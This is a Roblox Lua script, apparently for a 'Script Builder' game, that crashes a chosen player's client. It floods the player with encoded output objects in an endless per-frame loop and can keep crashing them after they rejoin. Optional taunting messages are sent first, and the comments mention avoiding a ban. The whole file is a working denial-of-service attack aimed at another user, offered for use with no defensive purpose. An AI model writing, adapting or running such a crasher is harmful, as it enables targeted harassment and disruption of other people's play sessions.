local crashPlayerName = "Username" -- Here the username to crash in Voidacity Script Builder
local firstMessages = false -- Scare to the victim with some messages before the crash (they can use g/ns/all if they have time and ban you, so it's so risky)
local timesForStep = 30 -- This is so laggy uh
local crashForever = false -- Crash even tought rejoin
local victim = game:GetService("Players")[crashPlayerName]

local gotDummy = "{959777|AAE} {145452|+_} {2916108|EBBCCC} {842712|e-} {3447056|ccE=m} {297344|-S} {1135158|FfaZ} {3441240|f+d+f++A=Fv} {233376|h} {2900634|FebfBfP} {7179480|cbeAcDa-aen} {2449920|c+Co} {169984|=i} {5562000|e+AFe } {5339061|Cd=DcEFf-eO} {726485|ct} {4247403|efEDO} {4429568|CcfecAbI} {1028840|BCBca2} {1890876|Dab=aEBCe=c}"

local heyNerd = "{2435615|DfdABh} {968626|==BbdF--d+DaA} {7164720|cABAA=dACf-=f} {4783896|cfC+Cd+dcW} {5719140|++=cDcEBaEW} {1110670|=EAE-D>} {3193248|B=Ed} {713592|==Z} {740520|E=D9} {987360|aAeaP} {4628448|-BbFf-deBaDt} {859914|b} {3151808|+-fFdFD+FEc#} {3697920|aEdAb=Aefb} {2798400|fCbdq} {1020706|-DCFL} {4251402|-EE-aL} {4690400|e=d+Ca-fbfV} {1313216|DeeFcf} {1078056|==aBby}"

local doULikeCrashing = "{4591496|Dc=Fc=bAB+F-k} {659804|c-=bCA-e-} {3214080|eEfe;} {4855032|FcAeE-aF-b<} {3727080|CAbfeY} {427570|eD} {2481240|-eT} {2914956|=c=d+D=Dd-=c} {583704|=d(} {1633632|FBaAB+BEAy} {2504304|=c=f=+BA} {6461532|dBDFDbfF+Cf} {464896|-f=cBQ} {10914345|AA+EEeEco} {849696|FdCCFa} {1509948|Ce+ca,} {9598995|d+FBEeCebbBh} {4885192|EeCf-+bdCAy} {5501268|dBD=b=++Bd_} {425408|=e-afFf} {7724208|AcdDfFdp} {4221360|fb==X} {1753158|fF[} {851136|BbA--T} {5031180|CbfDEaaaK} {1587564|cp} {1626496|+FBC-ee} {11426400|FaBCddaBI} {2563080|abBCe$} {1259685|bc=b} {2015310|bc} {1237236|dE>} {861084|ah} {662354|F-f=+EBf=Eb=} {7066233|d=B=EEE+eCo}"

local yesOk = "{2589951|DAaACcL} {519622|CeaFd:} {810960|m} {3491592|FabAFEx} {6347460|fabeEFEadV} {1776060|dfcAe--a0} {2999064|FFe%} {2066724|fc=bFcU} {734712|E=C8} {1790712|+c=d-dBfEq} {3759360|f+Feaee} {1013232|a7} {1935680|Db=fBE>} {8028720|CBFefFC-eFbW} {722496|-=fay} {1376400|af=e'} {7164720|aD-CFCADAl} {894608|BF-a`} {1701632|eAFBf+a} {311052|dc_} {758880|CEh} {1362636|d0}"

local byeNoob = "{2421146|D-dCey} {395250|=EAbR} {1562400|EDI} {2762448|DDfbb } {4690980|EEBaeD++e} {1583780|DeDE+DCFH} {2211540|al} {1235322|Abdh} {1463616|BcFddE} {336600|b4} {644688|EO} {4368342|dfaBeQ} {3034848|abfACeDdcd*} {3905280|ceEFd=EDeDb} {2180420|-afd} {1273170|aDdi} {7566759|aAfAcdAAK} {4866680|DCbFFc-AaefI} {617304|c=k} {652395|Bfc&}"

local crashMsg = "{4702425|CFbD-DDb=aab(} {1038190|bdDEDcedc++a} {6666240|Fe+=aEC+fDDk} {5637528|ddbb-eAbbDP} {2249100|cEDO} {2034120|f+=aE=fA-=b} {7238748|FaaDDEdf} {578952|=o} {1164504|eCaDD} {619344|Bem} {2277330|CaF+DAi} {1829256|AA+=h} {1368640|c=CFa-FCR} {9994860|Ff=BeBFd+Fb-} {2873448|e=daB+f-c'} {642444|EBcbBDAa} {1236342|Fcdz} {2993484|EfBAees}"

local function send(message)
	local obj = Instance.new("StringValue")
	obj.Name = "SB_Output:Output"
	obj.Value = message
	obj.Parent = victim
	return obj
end

if firstMessages then
	wait()
	send(heyNerd)
	wait(1)
	send(doULikeCrashing)
	wait(2)
	send(yesOk)
	wait(2)
	send(byeNoob)
	wait(.4)
end

send(crashMsg)
wait()
while true do
	for i = 1, timesForStep do
		send(crashMsg)
	end
	if crashForever then
		victim = game:GetService("Players"):findFirstChild(crashPlayerName)
	end
	game:GetService("RunService").Stepped:Wait()
end
